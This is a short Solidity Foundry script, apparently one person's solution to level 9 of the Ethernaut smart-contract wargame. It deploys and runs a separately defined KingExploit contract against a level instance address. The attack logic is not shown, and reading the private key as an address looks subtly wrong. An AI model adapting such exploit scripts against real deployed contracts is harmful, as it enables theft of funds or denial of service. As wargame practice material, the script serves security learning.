// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {KingExploit} from "src/09/KingExploit.sol";


contract Exploit is Script {

        KingExploit public exploit;   
        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));    
        address hacker = vm.envAddress("PRIVATE_KEY");    
        
        function run() external {

            vm.startBroadcast(hacker);
            exploit = new KingExploit();
            exploit.run(instance);
            vm.stopBroadcast();
    }
}
